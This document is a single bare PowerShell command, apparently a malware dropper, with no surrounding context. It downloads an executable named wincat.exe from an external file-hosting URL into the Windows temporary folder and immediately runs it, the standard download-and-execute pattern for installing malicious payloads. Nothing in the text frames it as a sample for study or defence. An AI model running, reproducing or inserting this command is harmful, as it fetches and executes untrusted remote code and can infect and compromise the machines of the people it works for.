
(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/6hrkjYlX4',"$env:TEMP\wincat.exe");Start-Process ("$env:TEMP\wincat.exe")

